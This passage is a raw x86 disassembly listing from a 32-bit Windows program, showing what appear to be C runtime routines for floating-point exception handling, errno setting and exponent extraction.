  40db41:	df e0                	fnstsw %ax
  40db43:	f6 c4 05             	test   $0x5,%ah
  40db46:	7a 1e                	jp     0x40db66
  40db48:	dd 05 68 3d 41 00    	fldl   0x413d68
  40db4e:	eb 1e                	jmp    0x40db6e
  40db50:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40db53:	d9 ee                	fldz
  40db55:	dc 19                	fcompl (%ecx)
  40db57:	df e0                	fnstsw %ax
  40db59:	f6 c4 05             	test   $0x5,%ah
  40db5c:	7a 08                	jp     0x40db66
  40db5e:	dd 05 60 3d 41 00    	fldl   0x413d60
  40db64:	eb 08                	jmp    0x40db6e
  40db66:	dd 05 60 3d 41 00    	fldl   0x413d60
  40db6c:	d9 e0                	fchs
  40db6e:	dd 19                	fstpl  (%ecx)
  40db70:	83 e6 fe             	and    $0xfffffffe,%esi
  40db73:	e9 e1 00 00 00       	jmp    0x40dc59
  40db78:	f6 c3 02             	test   $0x2,%bl
  40db7b:	0f 84 d8 00 00 00    	je     0x40dc59
  40db81:	f6 45 10 10          	testb  $0x10,0x10(%ebp)
  40db85:	0f 84 ce 00 00 00    	je     0x40dc59
  40db8b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40db8e:	57                   	push   %edi
  40db8f:	8b fb                	mov    %ebx,%edi
  40db91:	c1 ef 04             	shr    $0x4,%edi
  40db94:	dd 00                	fldl   (%eax)
  40db96:	83 e7 01             	and    $0x1,%edi
  40db99:	d9 ee                	fldz
  40db9b:	dd e9                	fucomp %st(1)
  40db9d:	df e0                	fnstsw %ax
  40db9f:	f6 c4 44             	test   $0x44,%ah
  40dba2:	0f 8b 9c 00 00 00    	jnp    0x40dc44
  40dba8:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40dbab:	50                   	push   %eax
  40dbac:	51                   	push   %ecx
  40dbad:	51                   	push   %ecx
  40dbae:	dd 1c 24             	fstpl  (%esp)
  40dbb1:	e8 ac 04 00 00       	call   0x40e062
  40dbb6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40dbb9:	83 c4 0c             	add    $0xc,%esp
  40dbbc:	81 c2 00 fa ff ff    	add    $0xfffffa00,%edx
  40dbc2:	dd 55 f0             	fstl   -0x10(%ebp)
  40dbc5:	d9 ee                	fldz
  40dbc7:	81 fa ce fb ff ff    	cmp    $0xfffffbce,%edx
  40dbcd:	7d 07                	jge    0x40dbd6
  40dbcf:	33 ff                	xor    %edi,%edi
  40dbd1:	de c9                	fmulp  %st,%st(1)
  40dbd3:	47                   	inc    %edi
  40dbd4:	eb 67                	jmp    0x40dc3d
  40dbd6:	de d9                	fcompp
  40dbd8:	df e0                	fnstsw %ax
  40dbda:	f6 c4 41             	test   $0x41,%ah
  40dbdd:	75 09                	jne    0x40dbe8
  40dbdf:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40dbe6:	eb 04                	jmp    0x40dbec
  40dbe8:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40dbec:	8b 45 f6             	mov    -0xa(%ebp),%eax
  40dbef:	b9 03 fc ff ff       	mov    $0xfffffc03,%ecx
  40dbf4:	83 e0 0f             	and    $0xf,%eax
  40dbf7:	83 c8 10             	or     $0x10,%eax
  40dbfa:	66 89 45 f6          	mov    %ax,-0xa(%ebp)
  40dbfe:	3b d1                	cmp    %ecx,%edx
  40dc00:	7d 30                	jge    0x40dc32
  40dc02:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40dc05:	2b ca                	sub    %edx,%ecx
  40dc07:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40dc0a:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
  40dc0e:	74 05                	je     0x40dc15
  40dc10:	85 ff                	test   %edi,%edi
  40dc12:	75 01                	jne    0x40dc15
  40dc14:	47                   	inc    %edi
  40dc15:	d1 e8                	shr    $1,%eax
  40dc17:	f6 45 f4 01          	testb  $0x1,-0xc(%ebp)
  40dc1b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40dc1e:	74 08                	je     0x40dc28
  40dc20:	0d 00 00 00 80       	or     $0x80000000,%eax
  40dc25:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40dc28:	d1 ea                	shr    $1,%edx
  40dc2a:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40dc2d:	83 e9 01             	sub    $0x1,%ecx
  40dc30:	75 d8                	jne    0x40dc0a
  40dc32:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40dc36:	dd 45 f0             	fldl   -0x10(%ebp)
  40dc39:	74 02                	je     0x40dc3d
  40dc3b:	d9 e0                	fchs
  40dc3d:	8b 45 0c             	mov    0xc(%ebp),%eax
  40dc40:	dd 18                	fstpl  (%eax)
  40dc42:	eb 05                	jmp    0x40dc49
  40dc44:	33 ff                	xor    %edi,%edi
  40dc46:	dd d8                	fstp   %st(0)
  40dc48:	47                   	inc    %edi
  40dc49:	85 ff                	test   %edi,%edi
  40dc4b:	5f                   	pop    %edi
  40dc4c:	74 08                	je     0x40dc56
  40dc4e:	6a 10                	push   $0x10
  40dc50:	e8 ff e3 ff ff       	call   0x40c054
  40dc55:	59                   	pop    %ecx
  40dc56:	83 e6 fd             	and    $0xfffffffd,%esi
  40dc59:	f6 c3 10             	test   $0x10,%bl
  40dc5c:	74 11                	je     0x40dc6f
  40dc5e:	f6 45 10 20          	testb  $0x20,0x10(%ebp)
  40dc62:	74 0b                	je     0x40dc6f
  40dc64:	6a 20                	push   $0x20
  40dc66:	e8 e9 e3 ff ff       	call   0x40c054
  40dc6b:	59                   	pop    %ecx
  40dc6c:	83 e6 ef             	and    $0xffffffef,%esi
  40dc6f:	33 c0                	xor    %eax,%eax
  40dc71:	85 f6                	test   %esi,%esi
  40dc73:	5e                   	pop    %esi
  40dc74:	0f 94 c0             	sete   %al
  40dc77:	5b                   	pop    %ebx
  40dc78:	c9                   	leave
  40dc79:	c3                   	ret
  40dc7a:	8b ff                	mov    %edi,%edi
  40dc7c:	55                   	push   %ebp
  40dc7d:	8b ec                	mov    %esp,%ebp
  40dc7f:	6a 00                	push   $0x0
  40dc81:	ff 75 1c             	push   0x1c(%ebp)
  40dc84:	ff 75 18             	push   0x18(%ebp)
  40dc87:	ff 75 14             	push   0x14(%ebp)
  40dc8a:	ff 75 10             	push   0x10(%ebp)
  40dc8d:	ff 75 0c             	push   0xc(%ebp)
  40dc90:	ff 75 08             	push   0x8(%ebp)
  40dc93:	e8 05 00 00 00       	call   0x40dc9d
  40dc98:	83 c4 1c             	add    $0x1c,%esp
  40dc9b:	5d                   	pop    %ebp
  40dc9c:	c3                   	ret
  40dc9d:	8b ff                	mov    %edi,%edi
  40dc9f:	55                   	push   %ebp
  40dca0:	8b ec                	mov    %esp,%ebp
  40dca2:	8b 45 08             	mov    0x8(%ebp),%eax
  40dca5:	33 c9                	xor    %ecx,%ecx
  40dca7:	53                   	push   %ebx
  40dca8:	33 db                	xor    %ebx,%ebx
  40dcaa:	43                   	inc    %ebx
  40dcab:	89 48 04             	mov    %ecx,0x4(%eax)
  40dcae:	8b 45 08             	mov    0x8(%ebp),%eax
  40dcb1:	57                   	push   %edi
  40dcb2:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
  40dcb7:	89 48 08             	mov    %ecx,0x8(%eax)
  40dcba:	8b 45 08             	mov    0x8(%ebp),%eax
  40dcbd:	89 48 0c             	mov    %ecx,0xc(%eax)
  40dcc0:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40dcc3:	f6 c1 10             	test   $0x10,%cl
  40dcc6:	74 0b                	je     0x40dcd3
  40dcc8:	8b 45 08             	mov    0x8(%ebp),%eax
  40dccb:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
  40dcd0:	09 58 04             	or     %ebx,0x4(%eax)
  40dcd3:	f6 c1 02             	test   $0x2,%cl
  40dcd6:	74 0c                	je     0x40dce4
  40dcd8:	8b 45 08             	mov    0x8(%ebp),%eax
  40dcdb:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
  40dce0:	83 48 04 02          	orl    $0x2,0x4(%eax)
  40dce4:	f6 c1 01             	test   $0x1,%cl
  40dce7:	74 0c                	je     0x40dcf5
  40dce9:	8b 45 08             	mov    0x8(%ebp),%eax
  40dcec:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
  40dcf1:	83 48 04 04          	orl    $0x4,0x4(%eax)
  40dcf5:	f6 c1 04             	test   $0x4,%cl
  40dcf8:	74 0c                	je     0x40dd06
  40dcfa:	8b 45 08             	mov    0x8(%ebp),%eax
  40dcfd:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
  40dd02:	83 48 04 08          	orl    $0x8,0x4(%eax)
  40dd06:	f6 c1 08             	test   $0x8,%cl
  40dd09:	74 0c                	je     0x40dd17
  40dd0b:	8b 45 08             	mov    0x8(%ebp),%eax
  40dd0e:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
  40dd13:	83 48 04 10          	orl    $0x10,0x4(%eax)
  40dd17:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dd1a:	56                   	push   %esi
  40dd1b:	8b 75 0c             	mov    0xc(%ebp),%esi
  40dd1e:	8b 06                	mov    (%esi),%eax
  40dd20:	c1 e0 04             	shl    $0x4,%eax
  40dd23:	f7 d0                	not    %eax
  40dd25:	33 41 08             	xor    0x8(%ecx),%eax
  40dd28:	83 e0 10             	and    $0x10,%eax
  40dd2b:	31 41 08             	xor    %eax,0x8(%ecx)
  40dd2e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dd31:	8b 06                	mov    (%esi),%eax
  40dd33:	03 c0                	add    %eax,%eax
  40dd35:	f7 d0                	not    %eax
  40dd37:	33 41 08             	xor    0x8(%ecx),%eax
  40dd3a:	83 e0 08             	and    $0x8,%eax
  40dd3d:	31 41 08             	xor    %eax,0x8(%ecx)
  40dd40:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dd43:	8b 06                	mov    (%esi),%eax
  40dd45:	d1 e8                	shr    $1,%eax
  40dd47:	f7 d0                	not    %eax
  40dd49:	33 41 08             	xor    0x8(%ecx),%eax
  40dd4c:	83 e0 04             	and    $0x4,%eax
  40dd4f:	31 41 08             	xor    %eax,0x8(%ecx)
  40dd52:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dd55:	8b 06                	mov    (%esi),%eax
  40dd57:	c1 e8 03             	shr    $0x3,%eax
  40dd5a:	f7 d0                	not    %eax
  40dd5c:	33 41 08             	xor    0x8(%ecx),%eax
  40dd5f:	83 e0 02             	and    $0x2,%eax
  40dd62:	31 41 08             	xor    %eax,0x8(%ecx)
  40dd65:	8b 06                	mov    (%esi),%eax
  40dd67:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dd6a:	c1 e8 05             	shr    $0x5,%eax
  40dd6d:	f7 d0                	not    %eax
  40dd6f:	33 41 08             	xor    0x8(%ecx),%eax
  40dd72:	23 c3                	and    %ebx,%eax
  40dd74:	31 41 08             	xor    %eax,0x8(%ecx)
  40dd77:	e8 31 e3 ff ff       	call   0x40c0ad
  40dd7c:	8b d0                	mov    %eax,%edx
  40dd7e:	f6 c2 01             	test   $0x1,%dl
  40dd81:	74 07                	je     0x40dd8a
  40dd83:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dd86:	83 49 0c 10          	orl    $0x10,0xc(%ecx)
  40dd8a:	f6 c2 04             	test   $0x4,%dl
  40dd8d:	74 07                	je     0x40dd96
  40dd8f:	8b 45 08             	mov    0x8(%ebp),%eax
  40dd92:	83 48 0c 08          	orl    $0x8,0xc(%eax)
  40dd96:	f6 c2 08             	test   $0x8,%dl
  40dd99:	74 07                	je     0x40dda2
  40dd9b:	8b 45 08             	mov    0x8(%ebp),%eax
  40dd9e:	83 48 0c 04          	orl    $0x4,0xc(%eax)
  40dda2:	f6 c2 10             	test   $0x10,%dl
  40dda5:	74 07                	je     0x40ddae
  40dda7:	8b 45 08             	mov    0x8(%ebp),%eax
  40ddaa:	83 48 0c 02          	orl    $0x2,0xc(%eax)
  40ddae:	f6 c2 20             	test   $0x20,%dl
  40ddb1:	74 06                	je     0x40ddb9
  40ddb3:	8b 45 08             	mov    0x8(%ebp),%eax
  40ddb6:	09 58 0c             	or     %ebx,0xc(%eax)
  40ddb9:	8b 06                	mov    (%esi),%eax
  40ddbb:	b9 00 0c 00 00       	mov    $0xc00,%ecx
  40ddc0:	23 c1                	and    %ecx,%eax
  40ddc2:	74 35                	je     0x40ddf9
  40ddc4:	3d 00 04 00 00       	cmp    $0x400,%eax
  40ddc9:	74 22                	je     0x40dded
  40ddcb:	3d 00 08 00 00       	cmp    $0x800,%eax
  40ddd0:	74 0c                	je     0x40ddde
  40ddd2:	3b c1                	cmp    %ecx,%eax
  40ddd4:	75 29                	jne    0x40ddff
  40ddd6:	8b 45 08             	mov    0x8(%ebp),%eax
  40ddd9:	83 08 03             	orl    $0x3,(%eax)
  40dddc:	eb 21                	jmp    0x40ddff
  40ddde:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dde1:	8b 01                	mov    (%ecx),%eax
  40dde3:	83 e0 fe             	and    $0xfffffffe,%eax
  40dde6:	83 c8 02             	or     $0x2,%eax
  40dde9:	89 01                	mov    %eax,(%ecx)
  40ddeb:	eb 12                	jmp    0x40ddff
  40dded:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ddf0:	8b 01                	mov    (%ecx),%eax
  40ddf2:	83 e0 fd             	and    $0xfffffffd,%eax
  40ddf5:	0b c3                	or     %ebx,%eax
  40ddf7:	eb f0                	jmp    0x40dde9
  40ddf9:	8b 45 08             	mov    0x8(%ebp),%eax
  40ddfc:	83 20 fc             	andl   $0xfffffffc,(%eax)
  40ddff:	8b 06                	mov    (%esi),%eax
  40de01:	b9 00 03 00 00       	mov    $0x300,%ecx
  40de06:	23 c1                	and    %ecx,%eax
  40de08:	74 20                	je     0x40de2a
  40de0a:	3d 00 02 00 00       	cmp    $0x200,%eax
  40de0f:	74 0c                	je     0x40de1d
  40de11:	3b c1                	cmp    %ecx,%eax
  40de13:	75 22                	jne    0x40de37
  40de15:	8b 45 08             	mov    0x8(%ebp),%eax
  40de18:	83 20 e3             	andl   $0xffffffe3,(%eax)
  40de1b:	eb 1a                	jmp    0x40de37
  40de1d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40de20:	8b 01                	mov    (%ecx),%eax
  40de22:	83 e0 e7             	and    $0xffffffe7,%eax
  40de25:	83 c8 04             	or     $0x4,%eax
  40de28:	eb 0b                	jmp    0x40de35
  40de2a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40de2d:	8b 01                	mov    (%ecx),%eax
  40de2f:	83 e0 eb             	and    $0xffffffeb,%eax
  40de32:	83 c8 08             	or     $0x8,%eax
  40de35:	89 01                	mov    %eax,(%ecx)
  40de37:	8b 45 08             	mov    0x8(%ebp),%eax
  40de3a:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40de3d:	c1 e1 05             	shl    $0x5,%ecx
  40de40:	33 08                	xor    (%eax),%ecx
  40de42:	81 e1 e0 ff 01 00    	and    $0x1ffe0,%ecx
  40de48:	31 08                	xor    %ecx,(%eax)
  40de4a:	8b 45 08             	mov    0x8(%ebp),%eax
  40de4d:	09 58 20             	or     %ebx,0x20(%eax)
  40de50:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  40de54:	74 2c                	je     0x40de82
  40de56:	8b 45 08             	mov    0x8(%ebp),%eax
  40de59:	83 60 20 e1          	andl   $0xffffffe1,0x20(%eax)
  40de5d:	8b 45 18             	mov    0x18(%ebp),%eax
  40de60:	d9 00                	flds   (%eax)
  40de62:	8b 45 08             	mov    0x8(%ebp),%eax
  40de65:	d9 58 10             	fstps  0x10(%eax)
  40de68:	8b 45 08             	mov    0x8(%ebp),%eax
  40de6b:	09 58 60             	or     %ebx,0x60(%eax)
  40de6e:	8b 45 08             	mov    0x8(%ebp),%eax
  40de71:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  40de74:	83 60 60 e1          	andl   $0xffffffe1,0x60(%eax)
  40de78:	8b 45 08             	mov    0x8(%ebp),%eax
  40de7b:	d9 03                	flds   (%ebx)
  40de7d:	d9 58 50             	fstps  0x50(%eax)
  40de80:	eb 3a                	jmp    0x40debc
  40de82:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40de85:	8b 41 20             	mov    0x20(%ecx),%eax
  40de88:	83 e0 e3             	and    $0xffffffe3,%eax
  40de8b:	83 c8 02             	or     $0x2,%eax
  40de8e:	89 41 20             	mov    %eax,0x20(%ecx)
  40de91:	8b 45 18             	mov    0x18(%ebp),%eax
  40de94:	dd 00                	fldl   (%eax)
  40de96:	8b 45 08             	mov    0x8(%ebp),%eax
  40de99:	dd 58 10             	fstpl  0x10(%eax)
  40de9c:	8b 45 08             	mov    0x8(%ebp),%eax
  40de9f:	09 58 60             	or     %ebx,0x60(%eax)
  40dea2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dea5:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  40dea8:	8b 41 60             	mov    0x60(%ecx),%eax
  40deab:	83 e0 e3             	and    $0xffffffe3,%eax
  40deae:	83 c8 02             	or     $0x2,%eax
  40deb1:	89 41 60             	mov    %eax,0x60(%ecx)
  40deb4:	8b 45 08             	mov    0x8(%ebp),%eax
  40deb7:	dd 03                	fldl   (%ebx)
  40deb9:	dd 58 50             	fstpl  0x50(%eax)
  40debc:	e8 58 e1 ff ff       	call   0x40c019
  40dec1:	8d 45 08             	lea    0x8(%ebp),%eax
  40dec4:	50                   	push   %eax
  40dec5:	6a 01                	push   $0x1
  40dec7:	6a 00                	push   $0x0
  40dec9:	57                   	push   %edi
  40deca:	ff 15 74 f1 40 00    	call   *0x40f174
  40ded0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ded3:	8b 41 08             	mov    0x8(%ecx),%eax
  40ded6:	a8 10                	test   $0x10,%al
  40ded8:	74 06                	je     0x40dee0
  40deda:	83 26 fe             	andl   $0xfffffffe,(%esi)
  40dedd:	8b 41 08             	mov    0x8(%ecx),%eax
  40dee0:	a8 08                	test   $0x8,%al
  40dee2:	74 06                	je     0x40deea
  40dee4:	83 26 fb             	andl   $0xfffffffb,(%esi)
  40dee7:	8b 41 08             	mov    0x8(%ecx),%eax
  40deea:	a8 04                	test   $0x4,%al
  40deec:	74 06                	je     0x40def4
  40deee:	83 26 f7             	andl   $0xfffffff7,(%esi)
  40def1:	8b 41 08             	mov    0x8(%ecx),%eax
  40def4:	a8 02                	test   $0x2,%al
  40def6:	74 06                	je     0x40defe
  40def8:	83 26 ef             	andl   $0xffffffef,(%esi)
  40defb:	8b 41 08             	mov    0x8(%ecx),%eax
  40defe:	a8 01                	test   $0x1,%al
  40df00:	74 03                	je     0x40df05
  40df02:	83 26 df             	andl   $0xffffffdf,(%esi)
  40df05:	8b 01                	mov    (%ecx),%eax
  40df07:	ba ff f3 ff ff       	mov    $0xfffff3ff,%edx
  40df0c:	83 e0 03             	and    $0x3,%eax
  40df0f:	83 e8 00             	sub    $0x0,%eax
  40df12:	74 35                	je     0x40df49
  40df14:	83 e8 01             	sub    $0x1,%eax
  40df17:	74 22                	je     0x40df3b
  40df19:	83 e8 01             	sub    $0x1,%eax
  40df1c:	74 0d                	je     0x40df2b
  40df1e:	83 e8 01             	sub    $0x1,%eax
  40df21:	75 28                	jne    0x40df4b
  40df23:	81 0e 00 0c 00 00    	orl    $0xc00,(%esi)
  40df29:	eb 20                	jmp    0x40df4b
  40df2b:	8b 06                	mov    (%esi),%eax
  40df2d:	25 ff fb ff ff       	and    $0xfffffbff,%eax
  40df32:	0d 00 08 00 00       	or     $0x800,%eax
  40df37:	89 06                	mov    %eax,(%esi)
  40df39:	eb 10                	jmp    0x40df4b
  40df3b:	8b 06                	mov    (%esi),%eax
  40df3d:	25 ff f7 ff ff       	and    $0xfffff7ff,%eax
  40df42:	0d 00 04 00 00       	or     $0x400,%eax
  40df47:	eb ee                	jmp    0x40df37
  40df49:	21 16                	and    %edx,(%esi)
  40df4b:	8b 01                	mov    (%ecx),%eax
  40df4d:	c1 e8 02             	shr    $0x2,%eax
  40df50:	83 e0 07             	and    $0x7,%eax
  40df53:	83 e8 00             	sub    $0x0,%eax
  40df56:	74 19                	je     0x40df71
  40df58:	83 e8 01             	sub    $0x1,%eax
  40df5b:	74 09                	je     0x40df66
  40df5d:	83 e8 01             	sub    $0x1,%eax
  40df60:	75 1a                	jne    0x40df7c
  40df62:	21 16                	and    %edx,(%esi)
  40df64:	eb 16                	jmp    0x40df7c
  40df66:	8b 06                	mov    (%esi),%eax
  40df68:	23 c2                	and    %edx,%eax
  40df6a:	0d 00 02 00 00       	or     $0x200,%eax
  40df6f:	eb 09                	jmp    0x40df7a
  40df71:	8b 06                	mov    (%esi),%eax
  40df73:	23 c2                	and    %edx,%eax
  40df75:	0d 00 03 00 00       	or     $0x300,%eax
  40df7a:	89 06                	mov    %eax,(%esi)
  40df7c:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  40df80:	5e                   	pop    %esi
  40df81:	74 07                	je     0x40df8a
  40df83:	d9 41 50             	flds   0x50(%ecx)
  40df86:	d9 1b                	fstps  (%ebx)
  40df88:	eb 05                	jmp    0x40df8f
  40df8a:	dd 41 50             	fldl   0x50(%ecx)
  40df8d:	dd 1b                	fstpl  (%ebx)
  40df8f:	5f                   	pop    %edi
  40df90:	5b                   	pop    %ebx
  40df91:	5d                   	pop    %ebp
  40df92:	c3                   	ret
  40df93:	8b ff                	mov    %edi,%edi
  40df95:	55                   	push   %ebp
  40df96:	8b ec                	mov    %esp,%ebp
  40df98:	8b 45 08             	mov    0x8(%ebp),%eax
  40df9b:	83 f8 01             	cmp    $0x1,%eax
  40df9e:	74 15                	je     0x40dfb5
  40dfa0:	83 c0 fe             	add    $0xfffffffe,%eax
  40dfa3:	83 f8 01             	cmp    $0x1,%eax
  40dfa6:	77 18                	ja     0x40dfc0
  40dfa8:	e8 0e 95 ff ff       	call   0x4074bb
  40dfad:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  40dfb3:	5d                   	pop    %ebp
  40dfb4:	c3                   	ret
  40dfb5:	e8 01 95 ff ff       	call   0x4074bb
  40dfba:	c7 00 21 00 00 00    	movl   $0x21,(%eax)
  40dfc0:	5d                   	pop    %ebp
  40dfc1:	c3                   	ret
  40dfc2:	8b ff                	mov    %edi,%edi
  40dfc4:	55                   	push   %ebp
  40dfc5:	8b ec                	mov    %esp,%ebp
  40dfc7:	8b 55 0c             	mov    0xc(%ebp),%edx
  40dfca:	83 ec 20             	sub    $0x20,%esp
  40dfcd:	33 c9                	xor    %ecx,%ecx
  40dfcf:	8b c1                	mov    %ecx,%eax
  40dfd1:	39 14 c5 d8 3b 41 00 	cmp    %edx,0x413bd8(,%eax,8)
  40dfd8:	74 08                	je     0x40dfe2
  40dfda:	40                   	inc    %eax
  40dfdb:	83 f8 1d             	cmp    $0x1d,%eax
  40dfde:	7c f1                	jl     0x40dfd1
  40dfe0:	eb 07                	jmp    0x40dfe9
  40dfe2:	8b 0c c5 dc 3b 41 00 	mov    0x413bdc(,%eax,8),%ecx
  40dfe9:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40dfec:	85 c9                	test   %ecx,%ecx
  40dfee:	74 55                	je     0x40e045
  40dff0:	8b 45 10             	mov    0x10(%ebp),%eax
  40dff3:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40dff6:	8b 45 14             	mov    0x14(%ebp),%eax
  40dff9:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40dffc:	8b 45 18             	mov    0x18(%ebp),%eax
  40dfff:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40e002:	8b 45 1c             	mov    0x1c(%ebp),%eax
  40e005:	56                   	push   %esi
  40e006:	8b 75 08             	mov    0x8(%ebp),%esi
  40e009:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40e00c:	8b 45 20             	mov    0x20(%ebp),%eax
  40e00f:	68 ff ff 00 00       	push   $0xffff
  40e014:	ff 75 28             	push   0x28(%ebp)
  40e017:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40e01a:	8b 45 24             	mov    0x24(%ebp),%eax
  40e01d:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40e020:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40e023:	e8 02 e0 ff ff       	call   0x40c02a
  40e028:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40e02b:	50                   	push   %eax
  40e02c:	e8 57 7b ff ff       	call   0x405b88
  40e031:	83 c4 0c             	add    $0xc,%esp
  40e034:	85 c0                	test   %eax,%eax
  40e036:	75 07                	jne    0x40e03f
  40e038:	56                   	push   %esi
  40e039:	e8 55 ff ff ff       	call   0x40df93
  40e03e:	59                   	pop    %ecx
  40e03f:	dd 45 f8             	fldl   -0x8(%ebp)
  40e042:	5e                   	pop    %esi
  40e043:	c9                   	leave
  40e044:	c3                   	ret
  40e045:	68 ff ff 00 00       	push   $0xffff
  40e04a:	ff 75 28             	push   0x28(%ebp)
  40e04d:	e8 d8 df ff ff       	call   0x40c02a
  40e052:	ff 75 08             	push   0x8(%ebp)
  40e055:	e8 39 ff ff ff       	call   0x40df93
  40e05a:	dd 45 20             	fldl   0x20(%ebp)
  40e05d:	83 c4 0c             	add    $0xc,%esp
  40e060:	c9                   	leave
  40e061:	c3                   	ret
  40e062:	8b ff                	mov    %edi,%edi
  40e064:	55                   	push   %ebp
  40e065:	8b ec                	mov    %esp,%ebp
  40e067:	dd 45 08             	fldl   0x8(%ebp)
  40e06a:	d9 ee                	fldz
  40e06c:	dd e1                	fucom  %st(1)
  40e06e:	df e0                	fnstsw %ax
  40e070:	56                   	push   %esi
  40e071:	f6 c4 44             	test   $0x44,%ah
  40e074:	7a 09                	jp     0x40e07f
  40e076:	dd d9                	fstp   %st(1)
  40e078:	33 f6                	xor    %esi,%esi
  40e07a:	e9 ad 00 00 00       	jmp    0x40e12c
  40e07f:	57                   	push   %edi
  40e080:	66 8b 7d 0e          	mov    0xe(%ebp),%di
  40e084:	0f b7 c7             	movzwl %di,%eax
  40e087:	a9 f0 7f 00 00       	test   $0x7ff0,%eax
  40e08c:	75 7a                	jne    0x40e108
  40e08e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40e091:	8b 55 08             	mov    0x8(%ebp),%edx
  40e094:	f7 c1 ff ff 0f 00    	test   $0xfffff,%ecx
  40e09a:	75 04                	jne    0x40e0a0
  40e09c:	85 d2                	test   %edx,%edx
  40e09e:	74 68                	je     0x40e108
  40e0a0:	de d9                	fcompp
  40e0a2:	be 03 fc ff ff       	mov    $0xfffffc03,%esi
  40e0a7:	df e0                	fnstsw %ax
  40e0a9:	53                   	push   %ebx
  40e0aa:	33 db                	xor    %ebx,%ebx
  40e0ac:	f6 c4 41             	test   $0x41,%ah
  40e0af:	75 01                	jne    0x40e0b2
  40e0b1:	43                   	inc    %ebx
  40e0b2:	f6 45 0e 10          	testb  $0x10,0xe(%ebp)
  40e0b6:	75 1f                	jne    0x40e0d7
  40e0b8:	03 c9                	add    %ecx,%ecx
  40e0ba:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40e0bd:	85 d2                	test   %edx,%edx
  40e0bf:	79 06                	jns    0x40e0c7
  40e0c1:	83 c9 01             	or     $0x1,%ecx
  40e0c4:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40e0c7:	03 d2                	add    %edx,%edx
  40e0c9:	4e                   	dec    %esi
  40e0ca:	f6 45 0e 10          	testb  $0x10,0xe(%ebp)
  40e0ce:	74 e8                	je     0x40e0b8
  40e0d0:	66 8b 7d 0e          	mov    0xe(%ebp),%di
  40e0d4:	89 55 08             	mov    %edx,0x8(%ebp)
  40e0d7:	b8 ef ff 00 00       	mov    $0xffef,%eax
  40e0dc:	66 23 f8             	and    %ax,%di
  40e0df:	85 db                	test   %ebx,%ebx
  40e0e1:	0f b7 c7             	movzwl %di,%eax
  40e0e4:	66 89 7d 0e          	mov    %di,0xe(%ebp)
  40e0e8:	5b                   	pop    %ebx
  40e0e9:	74 09                	je     0x40e0f4
  40e0eb:	0d 00 80 00 00       	or     $0x8000,%eax
  40e0f0:	66 89 45 0e          	mov    %ax,0xe(%ebp)
  40e0f4:	dd 45 08             	fldl   0x8(%ebp)
  40e0f7:	6a 00                	push   $0x0
  40e0f9:	51                   	push   %ecx
  40e0fa:	51                   	push   %ecx
  40e0fb:	dd 1c 24             	fstpl  (%esp)
  40e0fe:	e8 31 00 00 00       	call   0x40e134
  40e103:	83 c4 0c             	add    $0xc,%esp
  40e106:	eb 23                	jmp    0x40e12b
  40e108:	6a 00                	push   $0x0
  40e10a:	51                   	push   %ecx
  40e10b:	dd d8                	fstp   %st(0)
  40e10d:	51                   	push   %ecx
  40e10e:	dd 1c 24             	fstpl  (%esp)
  40e111:	e8 1e 00 00 00       	call   0x40e134
  40e116:	0f b7 f7             	movzwl %di,%esi
  40e119:	83 c4 0c             	add    $0xc,%esp
  40e11c:	c1 ee 04             	shr    $0x4,%esi
  40e11f:	81 e6 ff 07 00 00    	and    $0x7ff,%esi
  40e125:	81 ee fe 03 00 00    	sub    $0x3fe,%esi
  40e12b:	5f                   	pop    %edi
  40e12c:	8b 45 10             	mov    0x10(%ebp),%eax
  40e12f:	89 30                	mov    %esi,(%eax)
  40e131:	5e                   	pop    %esi
  40e132:	5d                   	pop    %ebp
  40e133:	c3                   	ret
  40e134:	8b ff                	mov    %edi,%edi
  40e136:	55                   	push   %ebp
  40e137:	8b ec                	mov    %esp,%ebp
  40e139:	51                   	push   %ecx
  40e13a:	51                   	push   %ecx
